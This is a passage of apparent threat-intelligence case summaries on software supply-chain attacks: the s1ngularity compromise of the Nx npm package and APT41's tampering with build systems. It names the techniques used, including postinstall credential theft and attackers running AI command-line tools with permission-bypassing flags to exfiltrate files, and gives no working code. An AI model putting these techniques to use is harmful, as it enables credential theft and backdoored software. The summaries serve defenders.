- **Target:** Nx build system npm package (used by hundreds of organizations for builds)
- **Timeline:** Malicious versions published August 26-28, 2025
- **Technique Status:** Attackers compromised npm maintainer accounts and published trojanized Nx versions. `postinstall` script executed malware that harvested GitHub tokens, npm tokens, SSH keys, and cryptocurrency wallet credentials.
- **Impact:** Hundreds of builds executed malicious code. Attacked leveraged AI command-line tools with dangerous flags (`--yolo`, `--dangerously-skip-permissions`, `--trust-all-tools`) to exfiltrate filesystem contents. Over 1,000 valid GitHub tokens and cloud credentials stolen.
- **Detection:** GitHub disabled attacker repositories within 8 hours. Wiz identified the campaign and traced artifacts.
- **Reference:** [Wiz - s1ngularity Attack Analysis](https://www.infoq.com/news/2025/10/npm-s1ngularity-shai-hulud/)

#### Example 3: APT41 - CI/CD Build System Compromise (2020-2021)

- **Target:** Software development organizations in healthcare, finance, telecommunications
- **Timeline:** Multi-year campaign targeting build infrastructure
- **Technique Status:** APT41 gained access to production build environments and injected malicious code into signed software binaries before release. Modified legitimate build scripts to include backdoors during compilation.
- **Impact:** Trojanized software distributed to hundreds of end-user organizations. Backdoors provided persistent remote access to compromised networks.
- **Detection:** Discovered through binary code analysis and behavioral monitoring of compromised systems (unusual outbound connections from build agents).
- **Reference:** [MITRE - APT41](https://attack.mitre.org/groups/G0096/)

---